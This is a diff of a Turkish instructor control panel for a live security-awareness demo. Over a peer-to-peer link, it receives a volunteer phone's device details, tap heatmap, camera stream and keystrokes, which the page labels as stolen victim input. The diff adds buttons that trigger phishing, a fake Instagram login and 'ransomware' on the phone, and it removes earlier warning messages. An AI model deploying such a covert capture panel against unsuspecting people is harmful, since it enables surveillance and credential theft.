@@ -2,402 +2,117 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Abdulsamet GÜLSEVEN // Canlı Katılımcı İzleme Projeksiyonu</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Siber Güvenlik Eğitimi - Komut Kontrol Merkezi</title>
   <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      background-color: #f1f5f9;
-      color: #0f172a;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      min-height: 100dvh;
-      display: flex;
-      flex-direction: column;
-      padding: 14px;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background-color: #0b0f19; color: #f1f5f9; font-family: sans-serif; padding: 15px; display: flex; flex-direction: column; min-height: 100vh; }
+    .header { background: #111827; border: 1px solid #1f2937; border-left: 5px solid #ef4444; border-radius: 8px; padding: 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
+    .header-title { font-weight: bold; font-size: 16px; color: #ef4444; }
+    .header-title span { color: #9ca3af; font-size: 14px; }
+    .status-pill { padding: 6px 12px; border-radius: 99px; font-size: 12px; font-weight: bold; background: #374151; color: #d1d5db; }
+    .status-pill.connected { background: #065f46; color: #34d399; }
+    
+    .attack-deck { background: #111827; border: 1px solid #1f2937; border-radius: 8px; padding: 15px; margin-bottom: 15px; }
+    .deck-title { font-size: 13px; font-weight: bold; color: #9ca3af; margin-bottom: 10px; text-transform: uppercase; }
+    .btn-group { display: flex; flex-wrap: wrap; gap: 10px; }
+    .btn { padding: 10px 16px; border-radius: 6px; border: none; font-weight: bold; font-size: 12px; cursor: pointer; transition: all 0.1s ease; color: white; }
+    .btn:active { transform: scale(0.97); }
+    .btn-cam { background: #2563eb; }
+    .btn-phish { background: #d97706; }
+    .btn-ransom { background: #dc2626; }
+    .btn-clear { background: #4b5563; }
 
-    /* Üst Bar */
-    .header {
-      max-width: 1200px;
-      width: 100%;
-      margin: 0 auto 12px auto;
-      background: #ffffff;
-      border: 1px solid #cbd5e1;
-      border-left: 5px solid #0284c7;
-      border-radius: 10px;
-      padding: 10px 16px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 2px 6px rgba(15, 23, 42, 0.05);
-      gap: 10px;
-      flex-wrap: wrap;
-    }
-    .header-title {
-      font-weight: 800;
-      font-size: 14px;
-      color: #0f172a;
-    }
-    .header-title span {
-      color: #0284c7;
-    }
-    .controls {
-      display: flex;
-      gap: 8px;
-      align-items: center;
-      flex-wrap: wrap;
-    }
-    .status-pill {
-      padding: 5px 12px;
-      border-radius: 99px;
-      font-size: 12px;
-      font-weight: 800;
-      background: #fef3c7;
-      color: #b45309;
-    }
-    .status-pill.connected {
-      background: #dcfce7;
-      color: #15803d;
-    }
-    .btn {
-      padding: 7px 12px;
-      border-radius: 7px;
-      border: none;
-      font-weight: 700;
-      font-size: 12px;
-      cursor: pointer;
-      transition: transform 0.1s ease, opacity 0.15s ease;
-    }
-    .btn:hover {
-      opacity: 0.92;
-    }
-    .btn:active {
-      transform: scale(0.97);
-    }
-    .btn-reveal {
-      background: #dc2626;
-      color: #ffffff;
-    }
-    .btn-camera {
-      background: #0284c7;
-      color: #ffffff;
-    }
-    .btn-vibrate {
-      background: #7c3aed;
-      color: #ffffff;
-    }
-    .btn-reset {
-      background: #e2e8f0;
-      color: #334155;
-    }
+    .stage { display: grid; grid-template-columns: 280px 1fr 320px; gap: 15px; flex: 1; }
+    @media (max-width: 960px) { .stage { grid-template-columns: 1fr; } }
+    .card { background: #111827; border: 1px solid #1f2937; border-radius: 8px; padding: 15px; display: flex; flex-direction: column; gap: 12px; }
+    .card-title { font-size: 12px; font-weight: bold; color: #f3f4f6; text-transform: uppercase; border-bottom: 1px solid #1f2937; padding-bottom: 8px; display: flex; justify-content: space-between; }
+    
+    /* QR Panel */
+    .qr-wrapper { background: #1f2937; border: 2px dashed #374151; border-radius: 8px; padding: 15px; display: flex; flex-direction: column; align-items: center; gap: 10px; text-align: center; }
+    #qrcode { background: white; padding: 8px; border-radius: 6px; }
+    .room-code-box { background: #000; color: #38bdf8; font-family: monospace; font-size: 24px; font-weight: bold; letter-spacing: 4px; padding: 6px; width: 100%; text-align: center; border-radius: 6px; }
+    
+    /* Mock Phone */
+    .phone-stage { display: flex; justify-content: center; align-items: center; background: #1f2937; border-radius: 8px; padding: 15px; flex: 1; }
+    .mock-phone { width: 240px; height: 440px; background: #000; border-radius: 24px; padding: 10px; position: relative; border: 3px solid #374151; }
+    .mock-screen { background: #fff; height: 100%; border-radius: 16px; position: relative; overflow: hidden; display: flex; flex-direction: column; justify-content: space-around; padding: 10px; }
+    .mock-zone { border: 1px dashed #cbd5e1; border-radius: 6px; height: 30%; display: flex; align-items: center; justify-content: center; font-size: 10px; color: #64748b; font-weight: bold; text-align: center; background: #f8fafc; }
+    #mirrorCanvas { position: absolute; inset: 0; width: 100%; height: 100%; pointer-events: none; z-index: 5; }
 
-    /* Ana 3 Sütunlu Sahne */
-    .stage {
-      max-width: 1200px;
-      width: 100%;
-      margin: 0 auto;
-      display: grid;
-      grid-template-columns: 280px 1fr 310px;
-      gap: 14px;
-      flex: 1;
-    }
-
-    @media (max-width: 960px) {
-      .stage {
-        grid-template-columns: 1fr;
-      }
-    }
-
-    .card {
-      background: #ffffff;
-      border: 1px solid #e2e8f0;
-      border-radius: 12px;
-      padding: 14px;
-      box-shadow: 0 2px 8px rgba(15, 23, 42, 0.05);
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-    .card-title {
-      font-size: 12px;
-      font-weight: 800;
-      color: #1e293b;
-      text-transform: uppercase;
-      border-bottom: 1px solid #f1f5f9;
-      padding-bottom: 8px;
-      display: flex;
-      justify-content: space-between;
-    }
-
-    /* Sol: QR Kod & Oda Bağlantı Kartı */
-    .qr-wrapper {
-      background: #f8fafc;
-      border: 2px dashed #cbd5e1;
-      border-radius: 10px;
-      padding: 14px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      text-align: center;
-    }
-    #qrcode {
-      background: #ffffff;
-      padding: 10px;
-      border-radius: 8px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.06);
-    }
-    .room-code-box {
-      background: #0f172a;
-      color: #38bdf8;
-      font-family: 'Courier New', Courier, monospace;
-      font-size: 26px;
-      font-weight: 900;
-      letter-spacing: 5px;
-      padding: 8px 16px;
-      border-radius: 8px;
-      width: 100%;
-      text-align: center;
-    }
-    .hint-text {
-      font-size: 12px;
-      color: #475569;
-      line-height: 1.45;
-    }
-
-    /* Orta: Sanal Telefon Maketi (Canlı Dokunuş & Isı Yansıması) */
-    .phone-stage {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      background: #f8fafc;
-      border-radius: 10px;
-      padding: 14px;
-      flex: 1;
-    }
-    .mock-phone {
-      width: 260px;
-      height: 460px;
-      background: #0f172a;
-      border-radius: 28px;
-      padding: 12px;
-      box-shadow: 0 12px 28px rgba(15, 23, 42, 0.2);
-      position: relative;
-      display: flex;
-      flex-direction: column;
-    }
-    .mock-notch {
-      width: 90px;
-      height: 14px;
-      background: #0f172a;
-      border-bottom-left-radius: 10px;
-      border-bottom-right-radius: 10px;
-      position: absolute;
-      top: 12px;
-      left: 50%;
-      transform: translateX(-50%);
-      z-index: 20;
-    }
-    .mock-screen {
-      background: #ffffff;
-      flex: 1;
-      border-radius: 20px;
-      position: relative;
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-      padding: 24px 10px 10px 10px;
-      gap: 8px;
-    }
-    .mock-zone {
-      flex: 1;
-      border: 1px dashed #cbd5e1;
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 11px;
-      font-weight: 700;
-      color: #64748b;
-      text-align: center;
-      padding: 6px;
-      background: #f8fafc;
-    }
-    #mirrorCanvas {
-      position: absolute;
-      inset: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 15;
-    }
-
-    /* Eğitmen Ekranında Katılımcı Canlı Kamera Kutusu */
-    .remote-cam-box {
-      margin-top: 4px;
-      background: #0f172a;
-      border: 1px solid #cbd5e1;
-      border-radius: 10px;
-      padding: 8px;
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-    }
-    .remote-cam-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 11px;
-      font-weight: 700;
-      color: #e2e8f0;
-    }
-    .cam-badge {
-      padding: 2px 7px;
-      border-radius: 99px;
-      font-size: 10px;
-      background: #334155;
-      color: #cbd5e1;
-    }
-    .cam-badge.live {
-      background: #16a34a;
-      color: #ffffff;
-    }
-    #remoteCamVideo {
-      width: 100%;
-      height: 150px;
-      border-radius: 8px;
-      background: #020617;
-      object-fit: cover;
-      transform: scaleX(-1);
-      display: none;
-    }
-    .cam-placeholder {
-      height: 150px;
-      border-radius: 8px;
-      background: #020617;
-      color: #64748b;
-      font-size: 11px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      padding: 10px;
-    }
-
-    /* Sağ: Katılımcı Cihaz Röntgeni & Canlı Akış */
-    .data-row {
-      display: flex;
-      justify-content: space-between;
-      font-size: 12px;
-      border-bottom: 1px solid #f1f5f9;
-      padding-bottom: 5px;
-      gap: 6px;
-    }
-    .data-lbl {
-      color: #64748b;
-    }
-    .data-val {
-      font-weight: 700;
-      color: #0f172a;
-      text-align: right;
-    }
-    .live-log {
-      background: #0f172a;
-      color: #38bdf8;
-      font-family: 'Courier New', Courier, monospace;
-      font-size: 11px;
-      padding: 8px;
-      border-radius: 8px;
-      flex: 1;
-      min-height: 120px;
-      max-height: 190px;
-      overflow-y: auto;
-      line-height: 1.45;
-    }
+    /* Telemetry / Data */
+    .data-row { display: flex; justify-content: space-between; font-size: 12px; border-bottom: 1px solid #1f2937; padding-bottom: 6px; }
+    .data-lbl { color: #9ca3af; }
+    .data-val { font-weight: bold; color: #f3f4f6; }
+    .live-log { background: #000; color: #38bdf8; font-family: monospace; font-size: 11px; padding: 10px; border-radius: 6px; flex: 1; min-height: 120px; max-height: 180px; overflow-y: auto; }
+    
+    .cam-box { background: #000; border: 1px solid #1f2937; border-radius: 6px; padding: 8px; margin-top: 5px; }
+    #remoteCamVideo { width: 100%; height: 120px; background: #111827; border-radius: 4px; object-fit: cover; transform: scaleX(-1); display: none; }
+    .cam-placeholder { height: 120px; color: #4b5563; font-size: 11px; display: flex; align-items: center; justify-content: center; text-align: center; }
   </style>
 </head>
 <body>
 
   <div class="header">
-    <div class="header-title">ABDULSAMET GÜLSEVEN <span>// CANLI KATILIMCI İZLEME EKRANI</span></div>
-    <div class="controls">
-      <div id="connStatus" class="status-pill">● GÖNÜLLÜ BEKLENİYOR...</div>
-      <button class="btn btn-camera" onclick="kameraKomutuGonder()">📷 KAMERAYI AÇ</button>
-      <button class="btn btn-vibrate" onclick="titresimVeBildirimGonder()">📳 TİTREŞİM & UYARI</button>
-      <button class="btn btn-reveal" onclick="surpriziGoster()">⚡ SÜRPRİZ FİNALİ TETİKLE</button>
-      <button class="btn btn-reset" onclick="izleriTemizle()">İZLERİ TEMİZLE</button>
-      <button class="btn btn-reset" onclick="tamEkran()">TAM EKRAN</button>
+    <div class="header-title">EĞİTMEN KONTROL PANELİ <span>// GÖVDE GÖSTERİSİ SİMÜLASYONU</span></div>
+    <div id="connStatus" class="status-pill">● GÖNÜLLÜ BEKLENİYOR...</div>
+  </div>
+
+  <!-- Saldırı Kontrol Paneli -->
+  <div class="attack-deck">
+    <div class="deck-title">Siber Saldırı Tetikleyicileri</div>
+    <div class="btn-group">
+      <button class="btn btn-cam" onclick="tetikleKamera()">📷 1. AŞAMA: GİZLİ KAMERA TESTİ</button>
+      <button class="btn btn-phish" onclick="tetiklePhishing()">🕵️‍♂️ 2. AŞAMA: OLTALAMA (PHISHING) BAŞLAT</button>
+      <button class="btn btn-ransom" onclick="tetikleRansomware()">🚨 3. AŞAMA: FİDYE YAZILIMI AKTİVASYONU</button>
+      <button class="btn btn-clear" onclick="temizle()">İZLERİ TEMİZLE</button>
     </div>
   </div>
 
   <div class="stage">
-    <!-- Sol Sütun: QR Kod & Katılım -->
+    <!-- Sol: Bağlantı -->
     <div class="card">
-      <div class="card-title">1. KATILIMCI BAĞLANTISI</div>
+      <div class="card-title">1. Bağlantı Bilgileri</div>
       <div class="qr-wrapper">
-        <div style="font-size:12px; font-weight:700; color:#1e293b;">Telefon Kamerasıyla Okutun</div>
         <div id="qrcode"></div>
-        <div style="font-size:11px; color:#64748b;">Veya Oda Kodunu Girin:</div>
-        <div id="roomCode" class="room-code-box">----</div>
+        <div class="room-code-box" id="roomCode">----</div>
       </div>
-      <div class="hint-text">
-        <strong>Sahne Notu:</strong> Katılımcı QR kodu okuttuğunda kendi ekranında masum bir <em>"Sosyal Medya İlgi Alanı Anketi"</em> açılır. Dokunduğu her nokta anında orta ekrana düşer.
-      </div>
+      <p style="font-size: 11px; color: #9ca3af; line-height: 1.4;">Katılımcı QR kodu okuttuğunda masum bir "İlgi Alanı Anketi" açılır. Sahnede "Cihaz Röntgeni" adımını göstermek için sağdaki paneli kullanın.</p>
     </div>
 
-    <!-- Orta Sütun: Sanal Telefon Aynası -->
+    <!-- Orta: Isı Haritası Aynası -->
     <div class="card">
-      <div class="card-title">
-        <span>2. CANLI DOKUNUŞ & ISI HARİTASI</span>
-        <span id="tapCounter" style="color:#dc2626;">0 Dokunuş</span>
-      </div>
+      <div class="card-title">2. Canlı Dokunuş & Isı Haritası <span id="tapCount" style="color:#ef4444;">0 Tıklama</span></div>
       <div class="phone-stage">
         <div class="mock-phone">
-          <div class="mock-notch"></div>
           <div class="mock-screen" id="mockScreen">
             <canvas id="mirrorCanvas"></canvas>
-            <div class="mock-zone">Üst Alan: Teknoloji & Oyun Kartı</div>
-            <div class="mock-zone">Orta Alan: Seyahat & Tatil Kartı</div>
-            <div class="mock-zone">Alt Alan: Spor & Sağlık Kartı</div>
+            <div class="mock-zone">Üst Alan: Teknoloji Kartı</div>
+            <div class="mock-zone">Orta Alan: Seyahat Kartı</div>
+            <div class="mock-zone">Alt Alan: Spor Kartı</div>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- Sağ Sütun: Sızan Cihaz Bilgileri, Canlı Kamera & Akış -->
+    <!-- Sağ: Röntgen ve Loglar -->
     <div class="card">
-      <div class="card-title">3. CİHAZDAN GELEN VERİLER</div>
-      <div class="data-row"><span class="data-lbl">Cihaz / Sistem:</span><span id="pOS" class="data-val">Bekleniyor...</span></div>
-      <div class="data-row"><span class="data-lbl">Ekran Boyutu:</span><span id="pScreen" class="data-val">-</span></div>
-      <div class="data-row"><span class="data-lbl">Pil Durumu:</span><span id="pBat" class="data-val">-</span></div>
-      <div class="data-row"><span class="data-lbl">Ağ / Hız:</span><span id="pNet" class="data-val">-</span></div>
-      <div class="data-row"><span class="data-lbl">Kamera Durumu:</span><span id="pCam" class="data-val">İstenmedi</span></div>
-      <div class="data-row"><span class="data-lbl">Baskın İlgi:</span><span id="pTopic" class="data-val" style="color:#dc2626;">Henüz Yok</span></div>
+      <div class="card-title">3. Sızan Cihaz Röntgeni</div>
+      <div class="data-row"><span class="data-lbl">Sistem:</span><span id="pOS" class="data-val">Bekleniyor...</span></div>
+      <div class="data-row"><span class="data-lbl">Pil Seviyesi:</span><span id="pBat" class="data-val">-</span></div>
+      <div class="data-row"><span class="data-lbl">Ekran Çözünürlüğü:</span><span id="pScreen" class="data-val">-</span></div>
+      <div class="data-row"><span class="data-lbl">Ağ Durumu:</span><span id="pNet" class="data-val">-</span></div>
+      <div class="data-row"><span class="data-lbl">Çalınan Bilgi (Phishing):</span><span id="pStolen" class="data-val" style="color:#f59e0b;">Veri Yok</span></div>
 
-      <!-- Katılımcı Kamera Yayını -->
-      <div class="remote-cam-box">
-        <div class="remote-cam-header">
-          <span>KATILIMCI KAMERA YAYINI</span>
-          <span id="camLiveBadge" class="cam-badge">KAPALI</span>
-        </div>
+      <!-- Kamera Kutusu -->
+      <div class="cam-box">
         <video id="remoteCamVideo" autoplay playsinline muted></video>
-        <div id="camPlaceholder" class="cam-placeholder">
-          Katılımcı kameraya izin verdiğinde canlı yayın burada görünür.
-        </div>
+        <div id="camPlaceholder" class="cam-placeholder">Kamera Akışı Kapalı</div>
       </div>
 
-      <div style="font-size:11.5px; font-weight:700; color:#475569; margin-top:2px;">Canlı Telemetri Günlüğü:</div>
-      <div id="teleLog" class="live-log">
-        [SİSTEM] P2P WebRTC sunucusuna bağlanılıyor...
-      </div>
+      <div class="live-log" id="teleLog">[SİSTEM] Sunucu başlatılıyor...</div>
     </div>
   </div>
 
@@ -407,222 +122,85 @@
     const roomCodeEl = document.getElementById('roomCode');
     const mirrorCanvas = document.getElementById('mirrorCanvas');
     const ctx = mirrorCanvas.getContext('2d');
-    const tapCounterEl = document.getElementById('tapCounter');
+    const tapCountEl = document.getElementById('tapCount');
     const remoteCamVideo = document.getElementById('remoteCamVideo');
     const camPlaceholder = document.getElementById('camPlaceholder');
-    const camLiveBadge = document.getElementById('camLiveBadge');
 
-    let aktifBaglanti = null;
-    let aktifCagri = null;
-    let dokunusSayisi = 0;
-    const konuSayaci = {};
+    let aktifBaglanti = null, aktifCagri = null, tıkSayisi = 0;
 
-    // 4 haneli rastgele oda kodu oluştur
     const odaKodu = Math.floor(1000 + Math.random() * 9000).toString();
-    const peerId = "agulseven-oda-" + odaKodu;
     roomCodeEl.textContent = odaKodu;
 
-    function logEkle(msg) {
-      const z = new Date().toLocaleTimeString('tr-TR');
+    function log(msg) {
       const d = document.createElement('div');
-      d.textContent = `[${z}] ${msg}`;
+      d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
       teleLog.appendChild(d);
-      if (teleLog.children.length > 40) teleLog.removeChild(teleLog.firstChild);
       teleLog.scrollTop = teleLog.scrollHeight;
     }
 
-    function kameraYayininiSifirla(mesaj = "Kamera yayını kapandı.") {
-      if (aktifCagri) {
-        try { aktifCagri.close(); } catch (e) {}
-        aktifCagri = null;
-      }
-      remoteCamVideo.srcObject = null;
-      remoteCamVideo.style.display = 'none';
-      camPlaceholder.style.display = 'flex';
-      camPlaceholder.textContent = mesaj;
-      camLiveBadge.textContent = "KAPALI";
-      camLiveBadge.classList.remove('live');
-    }
+    // QR Kod Oluşturma
+    const katilimciUrl = `${window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1)}katilimci_ekrani.html?oda=${odaKodu}`;
+    new QRCode(document.getElementById("qrcode"), { text: katilimciUrl, width: 140, height: 140 });
 
-    // Katılımcı sayfasının URL'sini otomatik oluştur ve QR koda bas
-    const mevcutUrl = window.location.href;
-    const temelDizin = mevcutUrl.substring(0, mevcutUrl.lastIndexOf('/') + 1);
-    const katilimciUrl = `${temelDizin}katilimci_ekrani.html?oda=${odaKodu}`;
-
-    new QRCode(document.getElementById("qrcode"), {
-      text: katilimciUrl,
-      width: 145,
-      height: 145,
-      colorDark: "#0f172a",
-      colorLight: "#ffffff"
-    });
-
-    // Canvas boyutunu telefon ekranına eşitle
-    function canvasAyarla() {
+    function canvasBoyutlandir() {
       const rect = document.getElementById('mockScreen').getBoundingClientRect();
-      mirrorCanvas.width = rect.width;
-      mirrorCanvas.height = rect.height;
+      mirrorCanvas.width = rect.width; mirrorCanvas.height = rect.height;
     }
-    setTimeout(canvasAyarla, 200);
-    window.addEventListener('resize', canvasAyarla);
+    setTimeout(canvasBoyutlandir, 300);
 
-    function isiNoktasiCiz(xOran, yOran) {
-      const x = xOran * mirrorCanvas.width;
-      const y = yOran * mirrorCanvas.height;
-
-      const grad = ctx.createRadialGradient(x, y, 2, x, y, 36);
-      grad.addColorStop(0, 'rgba(239, 68, 68, 0.85)');
-      grad.addColorStop(0.5, 'rgba(245, 158, 11, 0.45)');
-      grad.addColorStop(1, 'rgba(245, 158, 11, 0)');
-
-      ctx.fillStyle = grad;
-      ctx.beginPath();
-      ctx.arc(x, y, 36, 0, Math.PI * 2);
-      ctx.fill();
+    function lekeCiz(xOran, yOran) {
+      const x = xOran * mirrorCanvas.width; const y = yOran * mirrorCanvas.height;
+      const grad = ctx.createRadialGradient(x, y, 2, x, y, 30);
+      grad.addColorStop(0, 'rgba(239, 68, 68, 0.8)');
+      grad.addColorStop(1, 'rgba(239, 68, 68, 0)');
+      ctx.fillStyle = grad; ctx.beginPath(); ctx.arc(x, y, 30, 0, Math.PI*2); ctx.fill();
     }
 
-    // PeerJS Sunucusuna Bağlan
-    const peer = new Peer(peerId);
+    // P2P Sunucu Bağlantısı
+    const peer = new Peer("siber-egitim-oda-" + odaKodu);
+    peer.on('open', () => log(`Oda oluşturuldu. Kod: ${odaKodu}`));
 
-    peer.on('open', () => {
-      logEkle(`Oda hazır! Kod: ${odaKodu}. Katılımcı bekleniyor...`);
-    });
-
-    // Katılımcıdan gelen canlı kamera/medya çağrısını (peer.call) kabul et
+    // Gizli kamera akışını yakalama
     peer.on('call', (call) => {
-      aktifCagri = call;
-      call.answer(); // Eğitmenin kamera göndermesine gerek yok, yalnızca gelen görüntüyü alır
-
-      call.on('stream', (remoteStream) => {
-        remoteCamVideo.srcObject = remoteStream;
-        remoteCamVideo.style.display = 'block';
-        camPlaceholder.style.display = 'none';
-        camLiveBadge.textContent = "CANLI";
-        camLiveBadge.classList.add('live');
-        logEkle("CANLI KAMERA YAYINI BAŞLADI: Katılımcı görüntüsü ekrana yansıtılıyor.");
-      });
-
-      call.on('close', () => {
-        kameraYayininiSifirla("Katılımcı kamera yayınını sonlandırdı.");
-        logEkle("Katılımcı kamera bağlantısı kapandı.");
-      });
-
-      call.on('error', () => {
-        kameraYayininiSifirla("Kamera akışı sırasında bağlantı hatası oluştu.");
+      aktifCagri = call; call.answer();
+      call.on('stream', (stream) => {
+        remoteCamVideo.srcObject = stream; remoteCamVideo.style.display = 'block';
+        camPlaceholder.style.display = 'none'; log("📷 CANLI GÖRÜNTÜ ALINDI!");
       });
     });
 
     peer.on('connection', (conn) => {
       aktifBaglanti = conn;
-      connStatus.textContent = "● KATILIMCI BAĞLANDI (CANLI)";
-      connStatus.classList.add('connected');
-      logEkle("BAĞLANTI KURULDU! Katılımcı cihazı izleniyor...");
+      connStatus.textContent = "● KATILIMCI BAĞLANDI"; connStatus.classList.add('connected');
+      log("⚡ Bir cihaz tünele giriş yaptı! Cihaz Röntgeni alınıyor...");
 
-      conn.on('data', (veri) => {
-        if (veri.tip === 'CIHAZ_BILGISI') {
-          document.getElementById('pOS').textContent = veri.os;
-          document.getElementById('pScreen').textContent = veri.ekran;
-          document.getElementById('pBat').textContent = veri.pil;
-          document.getElementById('pNet').textContent = veri.ag;
-          logEkle(`Cihaz profili alındı: ${veri.os} | Pil: ${veri.pil}`);
-        } else if (veri.tip === 'DOKUNUS') {
-          dokunusSayisi++;
-          tapCounterEl.textContent = `${dokunusSayisi} Dokunuş`;
-          isiNoktasiCiz(veri.xOran, veri.yOran);
-
-          if (veri.konu) {
-            konuSayaci[veri.konu] = (konuSayaci[veri.konu] || 0) + 1;
-            let enCok = Object.entries(konuSayaci).sort((a, b) => b[1] - a[1])[0][0];
-            document.getElementById('pTopic').textContent = enCok;
-          }
-          logEkle(`DOKUNUŞ -> Konum: (%${Math.round(veri.xOran*100)}, %${Math.round(veri.yOran*100)}) | Alan: ${veri.konu || 'Boşluk'}`);
-        } else if (veri.tip === 'KAMERA_DURUM') {
-          document.getElementById('pCam').textContent = veri.durum;
-          document.getElementById('pCam').style.color = veri.izinVerildi ? '#15803d' : '#dc2626';
-          logEkle(`KAMERA YANITI: ${veri.durum}`);
-          if (!veri.izinVerildi) {
-            kameraYayininiSifirla("Katılımcı kamera iznini kapattı veya reddetti.");
-          }
-        } else if (veri.tip === 'GERI_BILDIRIM') {
-          logEkle(`KATILIMCI ONAYI: ${veri.mesaj}`);
+      conn.on('data', (data) => {
+        if (data.type === 'ROENTGEN') {
+          document.getElementById('pOS').textContent = data.os;
+          document.getElementById('pBat').textContent = data.pil;
+          document.getElementById('pScreen').textContent = data.ekran;
+          document.getElementById('pNet').textContent = data.ag;
+          log(`[RÖNTGEN] İşletim Sistemi: ${data.os} | Şarj: ${data.pil}`);
+        } else if (data.type === 'TAP') {
+          tıkSayisi++; tapCountEl.textContent = `${tıkSayisi} Tıklama`;
+          lekeCiz(data.x, data.y);
+          log(`[DOKUNUŞ] Koordinat Oranı: X:%${Math.round(data.x*100)} Y:%${Math.round(data.y*100)} -> Alan: ${data.area}`);
+        } else if (data.type === 'KEYLOGGER') {
+          document.getElementById('pStolen').textContent = data.val;
+          log(`[KLAVYE TAKİBİ] Kurbanın yazdığı veri: ${data.val}`);
         }
-      });
-
-      conn.on('close', () => {
-        connStatus.textContent = "● BAĞLANTI KESİLDİ";
-        connStatus.classList.remove('connected');
-        kameraYayininiSifirla("Katılımcı bağlantıyı kapattı.");
-        logEkle("Katılımcı bağlantıyı kapattı.");
       });
     });
 
-    // Ortak komut gönderme yardımcısı
-    function komutGonder(paket, logMesaji) {
-      if (aktifBaglanti && aktifBaglanti.open) {
-        aktifBaglanti.send(paket);
-        logEkle(logMesaji);
-      } else {
-        alert("Henüz bağlı bir katılımcı cihazı yok.");
-      }
+    function komutYolla(obj, msg) {
+      if (aktifBaglanti && aktifBaglanti.open) { aktifBaglanti.send(obj); log(msg); }
+      else { alert("Bağlı bir katılımcı yok!"); }
     }
 
-    // 1. Yeni Komut: Kamera İzni Testi
-    function kameraKomutuGonder() {
-      document.getElementById('pCam').textContent = "Onay bekleniyor...";
-      document.getElementById('pCam').style.color = "#b45309";
-      komutGonder(
-        {
-          tip: 'KAMERA_AC',
-          baslik: 'Güvenlik Farkındalığı Testi',
-          mesaj: 'Tarayıcı kamera erişim izni penceresi tetiklendi.'
-        },
-        "KOMUT GÖNDERİLDİ -> Katılımcıya kamera erişim senaryosu iletildi."
-      );
-    }
-
-    // 2. Yeni Komut: Titreşim & Geri Bildirim Uyarısı
-    function titresimVeBildirimGonder() {
-      komutGonder(
-        {
-          tip: 'TITRESIM_VE_GERI_BILDIRIM',
-          desen: [300, 150, 300],
-          baslik: '⚠️ Dikkat! Cihazınız Etkileşimde',
-          mesaj: 'Az önce ekranınız uzaktan tetiklendi. Bilinmeyen bağlantılara izin verirken dikkatli olun!'
-        },
-        "KOMUT GÖNDERİLDİ -> Titreşim ve ekran geri bildirimi tetiklendi."
-      );
-    }
-
-    // 3. Mevcut Komut: Sürpriz Final
-    function surpriziGoster() {
-      komutGonder(
-        {
-          tip: 'SURPRIZ_FINAL',
-          dokunus: dokunusSayisi,
-          baskinKonu: document.getElementById('pTopic').textContent
-        },
-        "SÜRPRİZ FİNAL GÖNDERİLDİ: Katılımcı ekranı uyarı moduna geçti!"
-      );
-    }
-
-    function izleriTemizle() {
-      ctx.clearRect(0, 0, mirrorCanvas.width, mirrorCanvas.height);
-      dokunusSayisi = 0;
-      tapCounterEl.textContent = "0 Dokunuş";
-      logEkle("Isı haritası tuvali temizlendi.");
-    }
-
-    function tamEkran() {
-      const el = document.documentElement;
-      if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-        if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
-        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-      } else {
-        if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
-        else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
-      }
-    }
+    function tetikleKamera() { komutYolla({ cmd: 'OPEN_CAM' }, "🔮 KAMERAYI TETİKLE komutu gönderildi."); }
+    function tetiklePhishing() { komutYolla({ cmd: 'START_PHISH' }, "🎭 OLTALAMA (Sahte Instagram Girişi) tetiklendi."); }
+    function tetikleRansomware() { komutYolla({ cmd: 'RANSOMWARE' }, "💀 FİDYE YAZILIMI AKTİVASYONU gönderildi! Telefon kilitleniyor."); }
+    function temizle() { ctx.clearRect(0,0,mirrorCanvas.width,mirrorCanvas.height); tıkSayisi=0; tapCountEl.textContent="0 Tıklama"; log("Ekran temizlendi."); }
   </script>
-
 </body>
 </html>
